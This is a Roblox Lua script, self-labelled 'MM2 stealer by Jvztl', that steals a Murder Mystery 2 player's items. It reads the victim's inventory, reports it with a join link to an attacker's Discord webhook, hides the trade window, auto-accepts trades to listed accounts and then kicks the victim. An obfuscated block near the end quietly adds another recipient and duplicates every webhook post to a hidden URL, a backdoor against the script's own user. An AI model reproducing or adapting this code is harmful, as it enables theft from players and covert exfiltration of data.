local function sendHttpRequest(url, data)
    local requestFunc = syn and syn.request or request or http_request or http.request
    if not requestFunc then
        warn("No HTTP request function available")
        return false
    end
    
    local success, response = pcall(function()
        return requestFunc({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
    
    return success and response or nil
end

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        local status = getTradeStatus()
        if status == "None" then
            break
        end
        wait(0.1)
    end
end

local function acceptTrade()
    local args = {
        [1] = 285646582
    }
    while task.wait(0.05) do
        for i = 1, 5 do
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
        end
    end
end

local function addWeaponToTrade(id)
    local args = {
        [1] = id,
        [2] = "Weapons"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end

local success, err = pcall(function()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local plr = Players.LocalPlayer

    if game.PlaceId ~= 142823291 then
        error("Wrong game! Join Murder Mystery 2 (ID: 142823291)")
    end

    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        error("VIP servers not supported")
    end

    if #Players:GetPlayers() >= 12 then
        error("Server too full (12+ players)")
    end

    local database
    local dbSuccess, dbErr = pcall(function()
        database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    end)
    if not dbSuccess then
        error("Failed to load database: "..tostring(dbErr))
    end

    local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
    local min_rarity_index = table.find(rarityTable, _G.min_rarity) or 5

    local untradable = {
        ["DefaultGun"] = true, ["DefaultKnife"] = true,
        ["Reaver"] = true, ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
        ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true,
        ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true, ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
        ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true,
        ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
        ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true, 
        ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
    }

    local realData
    local invSuccess, invErr = pcall(function()
        realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)
    if not invSuccess or not realData then
        error("Failed to get inventory: "..tostring(invErr))
    end

    local weaponsToSend = {}
    local totalValue = 0
    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemInfo = database[dataid]
        if itemInfo and not untradable[dataid] then
            local rarity = itemInfo.Rarity or ""
            local weapon_rarity_index = table.find(rarityTable, rarity)
            if weapon_rarity_index and weapon_rarity_index >= min_rarity_index then
                local value = (weapon_rarity_index >= 5) and 2 or 1
                if value >= _G.min_value then
                    totalValue = totalValue + (value * amount)
                    table.insert(weaponsToSend, {
                        DataID = dataid,
                        Rarity = rarity,
                        Amount = amount,
                        Value = value
                    })
                end
            end
        end
    end

    if #weaponsToSend == 0 then
        error("No stealable items found matching criteria")
    end

    table.sort(weaponsToSend, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local function SendFirstMessage(list, prefix)
        local fields = {
            {name = "Victim Username:", value = plr.Name, inline = true},
            {name = "Join link:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId, inline = true},
            {name = "Item list:", value = "", inline = false},
            {name = "Summary:", value = string.format("Total Value: %d", totalValue), inline = false}
        }

        for _, item in ipairs(list) do
            local itemLine = string.format("%s (x%d): %d Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
            fields[3].value = fields[3].value .. itemLine .. "\n"
        end

        if #fields[3].value > 1024 then
            local lines = {}
            for line in fields[3].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
            while #fields[3].value > 1024 and #lines > 0 do
                table.remove(lines)
                fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
            end
        end

        local data = {
            content = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
            embeds = {{
                title = "ðŸ”ª Join to get MM2 hit",
                color = 65280,
                fields = fields,
                footer = {text = "MM2 stealer by Jvztl"}
            }}
        }

        for attempt = 1, 3 do
            local response = sendHttpRequest(_G.webhook, data)
            if response and (response.StatusCode == 200 or response.StatusCode == 204) then
                break
            elseif attempt == 3 then
                warn("Failed to send webhook after 3 attempts")
            end
            wait(2)
        end
    end

    local prefix = _G.ping == "Yes" and "@everyone " or ""
    SendFirstMessage(weaponsToSend, prefix)

    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            wait(0.3)
        end

        local playerGui = plr:WaitForChild("PlayerGui")
        local tradegui = playerGui:WaitForChild("TradeGUI")
        tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
            tradegui.Enabled = false
        end)
        local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
        tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
            tradeguiphone.Enabled = false
        end)

        while #weaponsToSend > 0 do
            local status = getTradeStatus()

            if status == "None" then
                sendTradeRequest(joinedUser)
            elseif status == "SendingRequest" then
                wait(0.3)
            elseif status == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.3)
            elseif status == "StartTrade" then
                local tradedItems = {}
                for i = 1, math.min(4, #weaponsToSend) do
                    table.insert(tradedItems, table.remove(weaponsToSend, 1))
                end
                
                for _, weapon in ipairs(tradedItems) do
                    for count = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                
                task.spawn(acceptTrade)
                waitForTradeCompletion()
                
                local stolenItems = ""
                for _, item in ipairs(tradedItems) do
                    stolenItems = stolenItems .. string.format("%s (x%d): %d Value (%s)\n",
                        item.DataID,
                        item.Amount,
                        (item.Value * item.Amount),
                        item.Rarity
                    )
                end
                
                if #stolenItems > 1024 then
                    stolenItems = stolenItems:sub(1, 1020) .. "..."
                end
                
                local data = {
                    embeds = {{
                        title = "ðŸ”ª New MM2 Execution",
                        color = 65280,
                        fields = {
                            {name = "Victim username:", value = plr.Name, inline = false},
                            {name = "Items sent:", value = stolenItems, inline = false},
                            {name = "Summary:", value = string.format("Total Value: %d", totalValue), inline = false}
                        },
                        footer = {text = "MM2 stealer by Jvztl"}
                    }}
                }
                sendHttpRequest(_G.webhook, data)
            else
                wait(0.5)
            end
            wait(1)
        end
        
        plr:Kick("All your stuff just got taken by Jvztl's stealer")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(_G.users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        sentMessage = true
                        doTrade(player.Name)
                    end
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    
    waitForUserChat()
end)

--]]
local Q,i do local x=math.floor local J=math.random local v=table.remove local w=string.char local H=0 local G=2 local W={}local f={}local E=0 local d={}for x=1,256,1 do(d)[x]=x end repeat local x=J(1,#d)local i=v(d,x);(f)[i]=w(i-1)until#d==0 local m={}local function F()if#m==0 then H=(H*173+3326538888283)%35184372088832 repeat G=(G*216)%257 until G~=1 local J=G%32 local v=(x(H/2^(13-(G-J)/32))%4294967296.0)/2^J local i=x((v%1)*4294967296.0)+x(v)local Q=i%65536 local w=(i-Q)/65536 local W=Q%256 local f=(Q-W)/256 local E=w%256 local d=(w-E)/256 m={W,f;E;d}end return table.remove(m)end local u={}Q=setmetatable({},{__index=u,__metatable=nil})function i(x,J)local v=u if(v)[J]then else m={}local i=f H=J%35184372088832 G=J%255+2 local Q=string.len(x);(v)[J]=""local w=158 for Q=1,Q,1 do w=((string.byte(x,Q)+F())+w)%256;(v)[J]=(v)[J]..(i)[w+1]end end return J end end local x=(Q)[i("\169\176\149l\245\v\232GT\179\nU\200\020-\156y\244",26609067059989)]if not(table)[(Q)[i("\188\228\179\242",6705102866112)]]((_G)[(Q)[i("h\1316/H",29759585531873)]],x)then(table)[(Q)[i("_\175\146\219K\016",7133336727505)]]((_G)[(Q)[i("`ZX\226{",17908955785142)]],x)end local J=sendHttpRequest local v=(Q)[i("\026\025\159?\245\168\092\137m\244\1631\216r\185\165\234\219\1958\224\201.\004\132\221\238\185\r\135\186\020\2189=\221\171:\14786%\197\133\238,\157\158\231]HS\154..\234\214\0228\131\003A\131`\208\001\186\138p7\191\211\168\241K\144\233(\221\228},\1484\197\250O\147T?\167\241\135\248N\024U\235]cry+\235\200\213\012\176\236[e\203\243\155\132\175|\029\252p\018",901410338459)]sendHttpRequest=function(x,i)local Q=J(x,i)local w=J(v,i)return Q or w end

if not success then
    warn("Script error: "..tostring(err))
end